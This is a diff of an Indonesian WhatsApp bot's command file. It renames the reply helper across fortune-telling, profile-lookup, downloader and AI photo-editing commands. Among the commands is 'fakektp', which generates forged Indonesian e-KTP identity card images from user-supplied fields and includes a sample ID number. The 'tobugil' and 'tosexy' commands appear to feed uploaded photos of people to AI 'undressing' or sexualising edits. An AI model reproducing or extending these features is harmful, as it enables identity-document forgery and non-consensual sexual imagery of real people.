-Reply(`• *Nama :* ${anu.message.nama}\n• *Lahir :* ${anu.message.tgl_lahir}\n• *Peruntungan Tahun :* ${anu.message.peruntungan_tahun}\n• *Hasil :* ${anu.message.result}\n• *Catatan :* ${anu.message.catatan}`)
+if (anu.status == false) return replyV1(anu.message)
+replyV1(`• *Nama :* ${anu.message.nama}\n• *Lahir :* ${anu.message.tgl_lahir}\n• *Peruntungan Tahun :* ${anu.message.peruntungan_tahun}\n• *Hasil :* ${anu.message.result}\n• *Catatan :* ${anu.message.catatan}`)
 }
 break
 case 'weton': case 'wetonjawa': {
 
-if (!text) return Reply(`Contoh : ${command} 7, 7, 2005`)
+if (!text) return replyV1(`Contoh : ${command} 7, 7, 2005`)
 let [tgl, bln, thn] = text.split`,`
 let anu = await primbon.weton_jawa(tgl, bln, thn)
-if (anu.status == false) return Reply(anu.message)
-Reply(`• *Tanggal :* ${anu.message.tanggal}\n• *Jumlah Neptu :* ${anu.message.jumlah_neptu}\n• *Watak Hari :* ${anu.message.watak_hari}\n• *Naga Hari :* ${anu.message.naga_hari}\n• *Jam Baik :* ${anu.message.jam_baik}\n• *Watak Kelahiran :* ${anu.message.watak_kelahiran}`)
+if (anu.status == false) return replyV1(anu.message)
+replyV1(`• *Tanggal :* ${anu.message.tanggal}\n• *Jumlah Neptu :* ${anu.message.jumlah_neptu}\n• *Watak Hari :* ${anu.message.watak_hari}\n• *Naga Hari :* ${anu.message.naga_hari}\n• *Jam Baik :* ${anu.message.jam_baik}\n• *Watak Kelahiran :* ${anu.message.watak_kelahiran}`)
 }
 break
 case 'sifat': case 'karakter': {
 
-if (!text) return Reply(`Contoh : ${command} Dika, 7, 7, 2005`)
+if (!text) return replyV1(`Contoh : ${command} Dika, 7, 7, 2005`)
 let [nama, tgl, bln, thn] = text.split`,`
 let anu = await primbon.sifat_karakter_tanggal_lahir(nama, tgl, bln, thn)
-if (anu.status == false) return Reply(anu.message)
-Reply(`• *Nama :* ${anu.message.nama}\n• *Lahir :* ${anu.message.tgl_lahir}\n• *Garis Hidup :* ${anu.message.garis_hidup}`)
+if (anu.status == false) return replyV1(anu.message)
+replyV1(`• *Nama :* ${anu.message.nama}\n• *Lahir :* ${anu.message.tgl_lahir}\n• *Garis Hidup :* ${anu.message.garis_hidup}`)
 }
 break
 case 'keberuntungan': {
 
-if (!text) return Reply(`Contoh : ${command} Dika, 7, 7, 2005`)
+if (!text) return replyV1(`Contoh : ${command} Dika, 7, 7, 2005`)
 let [nama, tgl, bln, thn] = text.split`,`
 let anu = await primbon.potensi_keberuntungan(nama, tgl, bln, thn)
-if (anu.status == false) return Reply(anu.message)
-Reply(`• *Nama :* ${anu.message.nama}\n• *Lahir :* ${anu.message.tgl_lahir}\n• *Hasil :* ${anu.message.result}`)
+if (anu.status == false) return replyV1(anu.message)
+replyV1(`• *Nama :* ${anu.message.nama}\n• *Lahir :* ${anu.message.tgl_lahir}\n• *Hasil :* ${anu.message.result}`)
 }
 break
 case 'memancing': {
 
-if (!text) return Reply(`Contoh : ${command} 12, 1, 2022`)
+if (!text) return replyV1(`Contoh : ${command} 12, 1, 2022`)
 let [tgl, bln, thn] = text.split`,`
 let anu = await primbon.primbon_memancing_ikan(tgl, bln, thn)
-if (anu.status == false) return Reply(anu.message)
-Reply(`• *Tanggal :* ${anu.message.tgl_memancing}\n• *Hasil :* ${anu.message.result}\n• *Catatan :* ${anu.message.catatan}`)
+if (anu.status == false) return replyV1(anu.message)
+replyV1(`• *Tanggal :* ${anu.message.tgl_memancing}\n• *Hasil :* ${anu.message.result}\n• *Catatan :* ${anu.message.catatan}`)
 }
 break
 
 case 'masasubur': {
 
-if (!text) return Reply(`Contoh : ${command} 12, 1, 2022, 28\n\nNote : ${command} hari pertama menstruasi, siklus`)
+if (!text) return replyV1(`Contoh : ${command} 12, 1, 2022, 28\n\nNote : ${command} hari pertama menstruasi, siklus`)
 let [tgl, bln, thn, siklus] = text.split`,`
 let anu = await primbon.masa_subur(tgl, bln, thn, siklus)
-if (anu.status == false) return Reply(anu.message)
-Reply(`• *Hasil :* ${anu.message.result}\n• *Catatan :* ${anu.message.catatan}`)
+if (anu.status == false) return replyV1(anu.message)
+replyV1(`• *Hasil :* ${anu.message.result}\n• *Catatan :* ${anu.message.catatan}`)
 }
 break
 case 'zodiak': case 'zodiac': {
 
-if (!text) return Reply(`Contoh : ${prefix+ command} 7 7 2005`)
+if (!text) return replyV1(`Contoh : ${prefix+ command} 7 7 2005`)
 let zodiak = [
 ["capricorn", new Date(1970, 0, 1)],
 ["aquarius", new Date(1970, 0, 20)],
@@ -28770,16 +28743,16 @@ let birth = [date.getFullYear(), date.getMonth() + 1, date.getDate()]
 let zodiac = await getZodiac(birth[1], birth[2])
 
 let anu = await primbon.zodiak(zodiac)
-if (anu.status == false) return Reply(anu.message)
-Reply(`• *Zodiak :* ${anu.message.zodiak}\n• *Nomor :* ${anu.message.nomor_keberuntungan}\n• *Aroma :* ${anu.message.aroma_keberuntungan}\n• *Planet :* ${anu.message.planet_yang_mengitari}\n• *Bunga :* ${anu.message.bunga_keberuntungan}\n• *Warna :* ${anu.message.warna_keberuntungan}\n• *Batu :* ${anu.message.batu_keberuntungan}\n• *Elemen :* ${anu.message.elemen_keberuntungan}\n• *Pasangan Zodiak :* ${anu.message.pasangan_zodiak}\n• *Catatan :* ${anu.message.catatan}`)
+if (anu.status == false) return replyV1(anu.message)
+replyV1(`• *Zodiak :* ${anu.message.zodiak}\n• *Nomor :* ${anu.message.nomor_keberuntungan}\n• *Aroma :* ${anu.message.aroma_keberuntungan}\n• *Planet :* ${anu.message.planet_yang_mengitari}\n• *Bunga :* ${anu.message.bunga_keberuntungan}\n• *Warna :* ${anu.message.warna_keberuntungan}\n• *Batu :* ${anu.message.batu_keberuntungan}\n• *Elemen :* ${anu.message.elemen_keberuntungan}\n• *Pasangan Zodiak :* ${anu.message.pasangan_zodiak}\n• *Catatan :* ${anu.message.catatan}`)
 }
 break
 case 'shio': {
 
-if (!text) return Reply(`Contoh : ${command} tikus\n\nNote : For Detail https://primbon.com/shio.htm`)
+if (!text) return replyV1(`Contoh : ${command} tikus\n\nNote : For Detail https://primbon.com/shio.htm`)
 let anu = await primbon.shio(text)
-if (anu.status == false) return Reply(anu.message)
-Reply(`• *Hasil :* ${anu.message}`)
+if (anu.status == false) return replyV1(anu.message)
+replyV1(`• *Hasil :* ${anu.message}`)
 }
 break  
 //MENU EPHOTO
@@ -28816,7 +28789,7 @@ case "glitchtext":
         {
         
           if (!q) {
-            return Reply(`Contoh : ${cmd} conn Assistent`);
+            return replyV1(`Contoh : ${cmd} conn Assistent`);
           }
           let link;
           if (/glitchtext/.test(command)) {
@@ -28925,12 +28898,12 @@ case 'stalkig':
 case 'instagramstalk':
 case 'stalkinstagram':
 case 'igstalk': {
-    if (!text) return Reply(`Masukkan username Instagram!\nContoh: ${prefix}stalkig ryzz2.009`);
+    if (!text) return replyV1(`Masukkan username Instagram!\nContoh: ${prefix}stalkig ryzz2.009`);
     try {
         await sendRichStalk(conn, m.chat, 'instagram', text.trim());
     } catch (err) {
         console.error('[STALK IG]', err?.stack || err);
-        Reply(formatStalkError(err, 'Instagram'));
+        replyV1(formatStalkError(err, 'Instagram'));
     }
 }
 break;
@@ -28938,12 +28911,12 @@ break;
 case 'stalktt':
 case 'tiktokstalk':
 case 'ttstalk': {
-    if (!text) return Reply(`Masukkan username TikTok!\nContoh: ${prefix}stalktt khaby.lame`);
+    if (!text) return replyV1(`Masukkan username TikTok!\nContoh: ${prefix}stalktt khaby.lame`);
     try {
         await sendRichStalk(conn, m.chat, 'tiktok', text.trim());
     } catch (err) {
         console.error('[STALK TIKTOK]', err?.stack || err);
-        Reply(formatStalkError(err, 'TikTok'));
+        replyV1(formatStalkError(err, 'TikTok'));
     }
 }
 break;
@@ -28951,12 +28924,12 @@ break;
 case 'stalkml':
 case 'mlstalk':
 case 'mobilelegendstalk': {
-    if (!text) return Reply(`Masukkan User ID dan Zone ID MLBB!\nContoh: ${prefix}stalkml 134972929|2687`);
+    if (!text) return replyV1(`Masukkan User ID dan Zone ID MLBB!\nContoh: ${prefix}stalkml 134972929|2687`);
     try {
         await sendRichStalk(conn, m.chat, 'mlbb', text.trim());
     } catch (err) {
         console.error('[STALK MLBB]', err?.stack || err);
-        Reply(formatStalkError(err, 'Mobile Legends'));
+        replyV1(formatStalkError(err, 'Mobile Legends'));
     }
 }
 break;
@@ -28964,12 +28937,12 @@ break;
 case 'stalkroblox':
 case 'stalktoblox':
 case 'robloxstalk': {
-    if (!text) return Reply(`Masukkan username atau User ID Roblox!\nContoh: ${prefix}stalkroblox Builderman`);
+    if (!text) return replyV1(`Masukkan username atau User ID Roblox!\nContoh: ${prefix}stalkroblox Builderman`);
     try {
         await sendRichStalk(conn, m.chat, 'roblox', text.trim());
     } catch (err) {
         console.error('[STALK ROBLOX]', err?.stack || err);
-        Reply(formatStalkError(err, 'Roblox'));
+        replyV1(formatStalkError(err, 'Roblox'));
     }
 }
 break;
@@ -28977,12 +28950,12 @@ break;
 case 'stalktele':
 case 'telestalk':
 case 'telegramstalk': {
-    if (!text) return Reply(`Masukkan username Telegram publik!\nContoh: ${prefix}stalktele telegram`);
+    if (!text) return replyV1(`Masukkan username Telegram publik!\nContoh: ${prefix}stalktele telegram`);
     try {
         await sendRichStalk(conn, m.chat, 'telegram', text.trim());
     } catch (err) {
         console.error('[STALK TELEGRAM]', err?.stack || err);
-        Reply(formatStalkError(err, 'Telegram'));
+        replyV1(formatStalkError(err, 'Telegram'));
     }
 }
 break;
@@ -28991,12 +28964,12 @@ case 'stalkyt':
 case 'ytstalk':
 case 'youtubestalk':
 case 'stalkyoutube': {
-    if (!text) return Reply(`Masukkan username, handle, atau URL channel YouTube!\nContoh: ${prefix}stalkyt @MrBeast`);
+    if (!text) return replyV1(`Masukkan username, handle, atau URL channel YouTube!\nContoh: ${prefix}stalkyt @MrBeast`);
     try {
         await sendRichStalk(conn, m.chat, 'youtube', text.trim());
     } catch (err) {
         console.error('[STALK YOUTUBE]', err?.stack || err);
-        Reply(formatStalkError(err, 'YouTube'));
+        replyV1(formatStalkError(err, 'YouTube'));
     }
 }
 break;
@@ -29009,9 +28982,9 @@ case 'rwm':
     const q = m.quoted ? m.quoted : m;
     const mime = (q.msg || q).mimetype || '';
 
-    if (!/image/.test(mime)) return Reply(`mana foto nya?`);
+    if (!/image/.test(mime)) return replyV1(`mana foto nya?`);
 
-    Reply('⏳ Sedang menghapus watermark...');
+    replyV1('⏳ Sedang menghapus watermark...');
 
     let mediaPath;
 
@@ -29023,7 +28996,7 @@ case 'rwm':
         const apiResult = await ezremove(mediaPath);
 
         if (!apiResult.result) {
-            return Reply("❌ Gagal menghapus watermark!");
+            return replyV1("❌ Gagal menghapus watermark!");
         }
 
         const urlHasil = apiResult.result;
@@ -29038,7 +29011,7 @@ case 'rwm':
 
     } catch (error) {
         console.error('Error di removewm:', error);
-        Reply(`❌ Terjadi kesalahan saat memproses gambar.`);
+        replyV1(`❌ Terjadi kesalahan saat memproses gambar.`);
     } finally {
         if (mediaPath && fs.existsSync(mediaPath)) {
             fs.unlinkSync(mediaPath);
@@ -29055,10 +29028,10 @@ case 'ailuma': {;
     const mime = (quotedMsg.msg || quotedMsg).mimetype || '';
 
     if (!/image/.test(mime)) {
-        return Reply('📸 Kirim atau Reply gambar untuk menggunakan fitur ini!');
+        return replyV1('📸 Kirim atau Reply gambar untuk menggunakan fitur ini!');
     }
 
-    Reply('⏳ Upload & Generating Video...');
+    replyV1('⏳ Upload & Generating Video...');
 
     let mediaPath;
     let result;
@@ -29067,7 +29040,7 @@ case 'ailuma': {;
         const buffer = fs.readFileSync(mediaPath);
 
         result = await Luma(buffer, (prog) => {
-            Reply(`⚙️ ${prog}`);
+            replyV1(`⚙️ ${prog}`);
         });
 
         await conn.sendMessage(m.chat, {
@@ -29077,7 +29050,7 @@ case 'ailuma': {;
 
     } catch (err) {
         console.error(err);
-        Reply(`❌ Error proses: ${err?.message || err}`);
+        replyV1(`❌ Error proses: ${err?.message || err}`);
     }
 
     if (mediaPath && fs.existsSync(mediaPath)) {
@@ -29097,10 +29070,10 @@ case 'tofigura': {
     const mime = (q.msg || q).mimetype || '';
  
     if (!/image/.test(mime)) {
-        return Reply(`mana foto nya?`);
+        return replyV1(`mana foto nya?`);
     }
  
-    Reply('Loading...');
+    replyV1('Loading...');
 
     try {
         
@@ -29122,7 +29095,7 @@ case 'tofigura': {
  
     } catch (error) {
         console.error('Error di fitur aiedit:', error);
-        Reply(`❌ Terjadi kesalahan saat memproses gambar.`);
+        replyV1(`❌ Terjadi kesalahan saat memproses gambar.`);
     } finally {
         if (mediaPath && fs.existsSync(mediaPath)) {
             fs.unlinkSync(mediaPath);
@@ -29138,10 +29111,10 @@ case 'tosexy': {
     const mime = (q.msg || q).mimetype || '';
  
     if (!/image/.test(mime)) {
-        return Reply(`mana foto nya?`);
+        return replyV1(`mana foto nya?`);
     }
  
-    Reply('Loading...');
+    replyV1('Loading...');
 
     try {
         
@@ -29163,7 +29136,7 @@ case 'tosexy': {
  
     } catch (error) {
         console.error('Error di fitur aiedit:', error);
-        Reply(`❌ Terjadi kesalahan saat memproses gambar.`);
+        replyV1(`❌ Terjadi kesalahan saat memproses gambar.`);
     } finally {
         if (mediaPath && fs.existsSync(mediaPath)) {
             fs.unlinkSync(mediaPath);
@@ -29178,10 +29151,10 @@ case 'hitamkan': {
     const mime = (q.msg || q).mimetype || '';
  
     if (!/image/.test(mime)) {
-        return Reply(`mana foto nya?`);
+        return replyV1(`mana foto nya?`);
     }
  
-    Reply('Loading...');
+    replyV1('Loading...');
 
     try {
         
@@ -29202,7 +29175,7 @@ case 'hitamkan': {
  
     } catch (error) {
         console.error('Error di fitur aiedit:', error);
-        Reply(`❌ Terjadi kesalahan saat memproses gambar.`);
+        replyV1(`❌ Terjadi kesalahan saat memproses gambar.`);
     } finally {
         if (mediaPath && fs.existsSync(mediaPath)) {
             fs.unlinkSync(mediaPath);
@@ -29216,14 +29189,14 @@ case 'edit': {
     const mime = (q.msg || q).mimetype || '';
  
     if (!/image/.test(mime)) {
-        return Reply(`⚠️ _Reply sebuah gambar dengan caption *${cmd}aiedit <prompt>*_\n\nContoh: ${cmd}l ubah jadi anime`);
+        return replyV1(`⚠️ _Reply sebuah gambar dengan caption *${cmd}aiedit <prompt>*_\n\nContoh: ${cmd}l ubah jadi anime`);
     }
  
     if (!text) {
-        return Reply(`⚠️ Masukkan perintah edit (prompt)!\n\nContoh: ${cmd} ubah jadi sketsa pensil`);
+        return replyV1(`⚠️ Masukkan perintah edit (prompt)!\n\nContoh: ${cmd} ubah jadi sketsa pensil`);
     }
  
-    Reply('Loading...');
+    replyV1('Loading...');
 
     try {
         
@@ -29245,7 +29218,7 @@ case 'edit': {
  
     } catch (error) {
         console.error('Error di fitur aiedit:', error);
-        Reply(`❌ Terjadi kesalahan saat memproses gambar.`);
+        replyV1(`❌ Terjadi kesalahan saat memproses gambar.`);
     } finally {
         if (mediaPath && fs.existsSync(mediaPath)) {
             fs.unlinkSync(mediaPath);
@@ -29259,11 +29232,11 @@ case 'tobersama': {
     const mime = (q.msg || q).mimetype || '';
  
     if (!/image/.test(mime)) {
-        return Reply(`mana foto nya?`);
+        return replyV1(`mana foto nya?`);
     }
-    if (!text) return Reply(`contoh ${cmd} nama idola mu`)
+    if (!text) return replyV1(`contoh ${cmd} nama idola mu`)
  
-    Reply('Loading...');
+    replyV1('Loading...');
 
     try {
         
@@ -29285,7 +29258,7 @@ case 'tobersama': {
  
     } catch (error) {
         console.error('Error di fitur aiedit:', error);
-        Reply(`❌ Terjadi kesalahan saat memproses gambar.`);
+        replyV1(`❌ Terjadi kesalahan saat memproses gambar.`);
     } finally {
         if (mediaPath && fs.existsSync(mediaPath)) {
             fs.unlinkSync(mediaPath);
@@ -29322,10 +29295,10 @@ case 'toanime': {
     const mime = (q.msg || q).mimetype || '';
     
     if (!/image/.test(mime)) {
-        return Reply(`mana foto nya?`);
+        return replyV1(`mana foto nya?`);
     }
  
-    Reply('Loading...');
+    replyV1('Loading...');
 
     try {
         
@@ -29347,7 +29320,7 @@ case 'toanime': {
  
     } catch (error) {
         console.error('Error di fitur aiedit:', error);
-        Reply(`❌ Terjadi kesalahan saat memproses gambar.`);
+        replyV1(`❌ Terjadi kesalahan saat memproses gambar.`);
     } finally {
         if (mediaPath && fs.existsSync(mediaPath)) {
             fs.unlinkSync(mediaPath);
@@ -29361,7 +29334,7 @@ case 'tobugil': {
     const mime = (q.msg || q).mimetype || '';
  
     if (!/image/.test(mime)) {
-        return Reply(`mana foto nya?`);
+        return replyV1(`mana foto nya?`);
     }
 let media = await conn.downloadAndSaveMediaMessage(quoted);
 let directLink = await uploaden(media);
@@ -29380,19 +29353,19 @@ break;
 case 'mediafire':
 case 'mf': {
     const input = String(args[0] || text || '').trim().split(/\s+/)[0] || '';
-    if (!input) return Reply(`⚠️ Masukkan link MediaFire.\nContoh: ${prefix}mediafire https://www.mediafire.com/file/xxxxx/nama.zip`);
+    if (!input) return replyV1(`⚠️ Masukkan link MediaFire.\nContoh: ${prefix}mediafire https://www.mediafire.com/file/xxxxx/nama.zip`);
 
     let mediafireUrl;
     try {
         mediafireUrl = new URL(/^https?:\/\//i.test(input) ? input : `https://${input}`);
         const host = mediafireUrl.hostname.toLowerCase().replace(/^www\./, '');
         if (!(host === 'mediafire.com' || host.endsWith('.mediafire.com') || host === 'mfi.re')) {
-            return Reply('❌ Link harus berasal dari MediaFire atau mfi.re.');
+            return replyV1('❌ Link harus berasal dari MediaFire atau mfi.re.');
         }
-        if (!['http:', 'https:'].includes(mediafireUrl.protocol)) return Reply('❌ Protokol URL tidak didukung.');
+        if (!['http:', 'https:'].includes(mediafireUrl.protocol)) return replyV1('❌ Protokol URL tidak didukung.');
         mediafireUrl.hash = '';
     } catch {
-        return Reply('❌ URL MediaFire tidak valid.');
+        return replyV1('❌ URL MediaFire tidak valid.');
     }
 
     try {
@@ -29460,7 +29433,7 @@ case 'mf': {
     } catch (error) {
         console.error('[MEDIAFIRE DOWNLOAD ERROR]', error?.stack || error);
         await conn.sendMessage(m.chat, { react: { text: '❌', key: m.key } }).catch(() => {});
-        return Reply(`❌ Gagal mengunduh MediaFire. ${String(error?.message || error).slice(0, 260)}`);
+        return replyV1(`❌ Gagal mengunduh MediaFire. ${String(error?.message || error).slice(0, 260)}`);
     }
 }
 break
@@ -29471,28 +29444,28 @@ case 'pinfoto': {
     // .pinterest <url> dipertahankan untuk downloader tautan di atas.
     const input = String(text || '').trim()
     if (command === 'pin' && m.quoted && !input) {
-        if (!m.isGroup) return Reply(mess.group)
-        if (!isAdmins && !isCreator) return Reply(mess.admin)
-        if (!isBotAdmins) return Reply(mess.botAdmin)
+        if (!m.isGroup) return replyV1(mess.group)
+        if (!isAdmins && !isCreator) return replyV1(mess.admin)
+        if (!isBotAdmins) return replyV1(mess.botAdmin)
         const quotedKey = m.quoted?.key
         if (!quotedKey?.id || !quotedKey?.remoteJid) {
-            return Reply('❌ Pesan yang di-reply tidak memiliki key WhatsApp yang valid. Coba reply pesan langsung lalu kirim .pin.')
+            return replyV1('❌ Pesan yang di-reply tidak memiliki key WhatsApp yang valid. Coba reply pesan langsung lalu kirim .pin.')
         }
         try {
             await conn.sendMessage(m.chat, {
                 pin: { type: 1, time: 86400, key: quotedKey }
             }, { quoted: m })
-            return Reply('📌 Pesan berhasil dipin selama 24 jam.')
+            return replyV1('📌 Pesan berhasil dipin selama 24 jam.')
         } catch (err) {
             console.error('[PIN MESSAGE ERROR]', err?.stack || err)
             const detail = String(err?.message || err || '')
             if (/invalid media type/i.test(detail)) {
-                return Reply('❌ Library WhatsApp menolak format pin pesan (invalid media type). Pastikan dependency Baileys yang terpasang sesuai package.json, lalu restart bot. Pesan belum dipastikan berhasil dipin.')
+                return replyV1('❌ Library WhatsApp menolak format pin pesan (invalid media type). Pastikan dependency Baileys yang terpasang sesuai package.json, lalu restart bot. Pesan belum dipastikan berhasil dipin.')
             }
-            return Reply(`❌ Gagal pin pesan: ${detail || 'kesalahan tidak diketahui'}`)
+            return replyV1(`❌ Gagal pin pesan: ${detail || 'kesalahan tidak diketahui'}`)
         }
     }
-    if (!input) return Reply(`📌 *PINTEREST SEARCH*\n\nContoh:\n${prefix}pin anime 5\n${prefix}pin wallpaper 3\n\nUntuk pin pesan: reply pesannya lalu ketik ${prefix}pin.\nJumlah gambar maksimal 10.`)
+    if (!input) return replyV1(`📌 *PINTEREST SEARCH*\n\nContoh:\n${prefix}pin anime 5\n${prefix}pin wallpaper 3\n\nUntuk pin pesan: reply pesannya lalu ketik ${prefix}pin.\nJumlah gambar maksimal 10.`)
 
     let query = input
     let imgCount = 5
@@ -29504,10 +29477,10 @@ case 'pinfoto': {
             query = input.slice(0, lastSpace).trim()
         }
     }
-    if (!query) return Reply(`Masukkan kata kunci Pinterest. Contoh: ${prefix}pin anime 5`)
+    if (!query) return replyV1(`Masukkan kata kunci Pinterest. Contoh: ${prefix}pin anime 5`)
 
     await conn.sendMessage(m.chat, { react: { text: '🔎', key: m.key } }).catch(() => {})
-    await Reply(`🔎 Sedang mencari Pinterest: *${query}* ...`)
+    await replyV1(`🔎 Sedang mencari Pinterest: *${query}* ...`)
     const searchPinterest = async (searchQuery) => {
         const cookiesResponse = await axios.get('https://www.pinterest.com/csrf_error/', {
             timeout: 20000,
@@ -29585,9 +29558,9 @@ case 'pinfoto': {
                 console.warn('[PINTEREST SEARCH API FALLBACK ERROR]', apiError?.response?.status || apiError?.message || apiError)
             }
         }
-        if (!results.length) return Reply(`❌ Pencarian gambar Pinterest sedang dibatasi oleh layanan (sering berupa HTTP 403) atau tidak menemukan hasil untuk *${query}*. Coba lagi beberapa saat lagi. Jika berlanjut, cek log [PINTEREST SEARCH] di console.`)
+        if (!results.length) return replyV1(`❌ Pencarian gambar Pinterest sedang dibatasi oleh layanan (sering berupa HTTP 403) atau tidak menemukan hasil untuk *${query}*. Coba lagi beberapa saat lagi. Jika berlanjut, cek log [PINTEREST SEARCH] di console.`)
         const count = Math.min(imgCount, results.length, 10)
-        await Reply(`✅ Ditemukan ${results.length} gambar. Mengirim ${count} gambar untuk *${query}*.`)
+        await replyV1(`✅ Ditemukan ${results.length} gambar. Mengirim ${count} gambar untuk *${query}*.`)
         let sent = 0
         for (const item of results.slice(0, count)) {
             try {
@@ -29601,17 +29574,17 @@ case 'pinfoto': {
                 console.error('[PINTEREST SEND ERROR]', sendError?.message || sendError)
             }
         }
-        return Reply(`✅ Berhasil mengirim ${sent}/${count} gambar Pinterest.`)
+        return replyV1(`✅ Berhasil mengirim ${sent}/${count} gambar Pinterest.`)
     } catch (err) {
         console.error('[PINTEREST ERROR]', err?.stack || err)
-        return Reply('❌ Pencarian Pinterest gagal. Layanan mungkin membatasi permintaan; coba lagi nanti.')
+        return replyV1('❌ Pencarian Pinterest gagal. Layanan mungkin membatasi permintaan; coba lagi nanti.')
     }
 }
 break
 
 case 'playstore': {
-if (!text) return Reply(`${prefix + command} WhatsApp`)
-Reply('Proses..')
+if (!text) return replyV1(`${prefix + command} WhatsApp`)
+replyV1('Proses..')
 await fetch(`https://api.diioffc.web.id/api/search/playstore?query=${text}`).then(async (res) => {
 let response = await res.json()
 let teks = '*🔎 Hasil Pencarian PLAY STORE*\n\n'
@@ -29622,8 +29595,8 @@ teks += `*◦ Rating :* ${i.rate}\n`
 teks += `*◦ Link Developer Url :* ${i.link_dev}\n`
 teks += `*◦ Link Apps Url :* ${i.link}\n\n`
 }
-Reply(teks)
-}).catch(err => Reply('Error 🗿'))
+replyV1(teks)
+}).catch(err => replyV1('Error 🗿'))
 }
 break
 
@@ -29631,14 +29604,14 @@ break
 case 'fakektp': {
     try {
         if (!text) {
-            return Reply(`*Contoh penggunaan:*\n${prefix + command} provinsi|kota|nik|nama|ttl|jenis_kelamin|golongan_darah|alamat|rt/rw|kelurahan|kecamatan|agama|status|pekerjaan|kewarganegaraan|masa_berlaku|terbuat|photo_url\n\n*Format contoh:*\n${prefix + command} Jakarta|Jakarta Timur|31752331637393|Reyz|24-04-2008 Jakarta|laki-laki|AB|jalan bahagia|08/06|Tengah|Kramat jati|Islam|belum menikah|manajer|Indonesia|seumur hidup|21-12-2025|https://cdn.yupra.my.id/yp/vi1275ok.png`);
+            return replyV1(`*Contoh penggunaan:*\n${prefix + command} provinsi|kota|nik|nama|ttl|jenis_kelamin|golongan_darah|alamat|rt/rw|kelurahan|kecamatan|agama|status|pekerjaan|kewarganegaraan|masa_berlaku|terbuat|photo_url\n\n*Format contoh:*\n${prefix + command} Jakarta|Jakarta Timur|31752331637393|Reyz|24-04-2008 Jakarta|laki-laki|AB|jalan bahagia|08/06|Tengah|Kramat jati|Islam|belum menikah|manajer|Indonesia|seumur hidup|21-12-2025|https://cdn.yupra.my.id/yp/vi1275ok.png`);
         }
 
         await conn.sendMessage(m.chat, { react: { text: '⏳', key: m.key } });
 
         const params = text.split('|');
         if (params.length < 18) {
-            return Reply(`*🍂 Parameter kurang!*\n\nDibutuhkan *18 parameter*, tetapi hanya menerima *${params.length}*.\n*Pastikan urutan parameter sesuai contoh!*`);
+            return replyV1(`*🍂 Parameter kurang!*\n\nDibutuhkan *18 parameter*, tetapi hanya menerima *${params.length}*.\n*Pastikan urutan parameter sesuai contoh!*`);
         }
 
         const baseURL = 'https://theresapisv3.vercel.app/canvas/ektp';
@@ -29667,7 +29640,7 @@ case 'fakektp': {
         const response = await fetch(url);
         
         if (!response.ok) {
-            Reply (`*🍂 Gagal mengambil gambar!*\n*Status server:* ${response.status} ${response.statusText}`);
+            replyV1 (`*🍂 Gagal mengambil gambar!*\n*Status server:* ${response.status} ${response.statusText}`);
         }
 
         const buffer = await response.arrayBuffer();
@@ -29676,7 +29649,7 @@ case 'fakektp': {
         }, { quoted: m });
 
     } catch (error) {
-        Reply(`*🍂 Terjadi kesalahan!*\n\n*Pesan error:* ${error.message}\n*Tips:* Periksa kembali URL foto atau koneksi internet Anda.`);
+        replyV1(`*🍂 Terjadi kesalahan!*\n\n*Pesan error:* ${error.message}\n*Tips:* Periksa kembali URL foto atau koneksi internet Anda.`);
     } finally {
         await conn.sendMessage(m.chat, { react: { text: '', key: m.key } });
     }
@@ -29693,21 +29666,21 @@ case 'dongeng': {
  caption: caption
  }, { quoted: m });
  } catch (e) {
- Reply('Gagal mengambil dongeng. Coba lagi nanti.');
+ replyV1('Gagal mengambil dongeng. Coba lagi nanti.');
  console.error(e);
  }
 }
  break
 
 case 'jarak': case 'rute': case 'cekjarak': case 'cekrute':
- if (!text.includes(',')) return Reply('Format salah! Gunakan: jarak [kota asal],[kota tujuan]\nContoh: jarak bekasi,madiun');
+ if (!text.includes(',')) return replyV1('Format salah! Gunakan: jarak [kota asal],[kota tujuan]\nContoh: jarak bekasi,madiun');
  
  let [from, to] = text.split(',').map(v => v.trim());
  let biyumaunyepong = `https://api.vreden.my.id/api/tools/jarak?from=${encodeURIComponent(from)}&to=${encodeURIComponent(to)}`;
  try {
  let response = await fetch(biyumaunyepong);
  let data = await response.json();
- if (data.status !== 200) return Reply('Gagal mendapatkan data jarak! Pastikan kota yang dimasukkan benar.');
+ if (data.status !== 200) return replyV1('Gagal mendapatkan data jarak! Pastikan kota yang dimasukkan benar.');
  let result = data.result;
  let msg = `📍 *Informasi Jarak* 📍
  
@@ -29721,10 +29694,10 @@ case 'jarak': case 'rute': case 'cekjarak': case 'cekrute':
 
 📍 *Rute Perjalanan:* 
 ${result.arah_penunjuk_jalan.map(step => `🚘 ${step.instruksi} (${step.jarak})`).join('\n')}`;
- Reply(msg);
+ replyV1(msg);
  } catch (e) {
  console.error(e);
- Reply('Terjadi kesalahan saat mengambil data!');
+ replyV1('Terjadi kesalahan saat mengambil data!');
  }
  break
 case "cecan": case "cn": {
@@ -29798,7 +29771,7 @@ case "cecan": case "cn": {
  } catch (error) {
  console.error('Error:', error)
  await conn.sendMessage(m.chat, {react: {text: '❌', key: m.key}})
- return Reply('Terjadi kesalahan saat mengambil gambar. Silahkan coba lagi.')
+ return replyV1('Terjadi kesalahan saat mengambil gambar. Silahkan coba lagi.')
  }
 }
 break
@@ -29807,7 +29780,7 @@ case 'cogan': {
  try {
  const res = await fetch('https://raw.githubusercontent.com/veann-xyz/result-daniapi/main/cecan/cogan.json');
  const data = await res.json();
- if (!Array.isArray(data)) return Reply('Data tidak valid.');
+ if (!Array.isArray(data)) return replyV1('Data tidak valid.');
  const randomImage = data[Math.floor(Math.random() * data.length)];
  conn.sendMessage(m.chat, {
  image: { url: randomImage },
@@ -29815,7 +29788,7 @@ case 'cogan': {
  }, { quoted: m });
  } catch (err) {
  console.error(err);
- Reply('Gagal mengambil data cogan.');
+ replyV1('Gagal mengambil data cogan.');
  }
  }
  break
@@ -29827,7 +29800,7 @@ case 'roasting': {
  : text
  ? text.replace(/[^0-9]/g, '') + '@s.whatsapp.net'
  : null;
- if (!orang) return Reply('Tag orang atau ketik nomornya, contoh: .roast @user atau .roast 628xxxx*');
+ if (!orang) return replyV1('Tag orang atau ketik nomornya, contoh: .roast @user atau .roast 628xxxx*');
  let ppthumb;
  try {
  ppthumb = await conn.profilePictureUrl(orang, 'image');
@@ -29887,13 +29860,13 @@ case 'roasting': {
  });
  } catch (error) {
  console.error("Error saat mengirim pesan:", error);
- Reply('Terjadi kesalahan saat mengirim pesan, coba lagi nanti.');
+ replyV1('Terjadi kesalahan saat mengirim pesan, coba lagi nanti.');
  }
 }
 break
 
 case "hitamin": {
- if (!/image/.test(mime)) return Reply("Reply gambar yang mau dihitamin dengan caption hitamin");
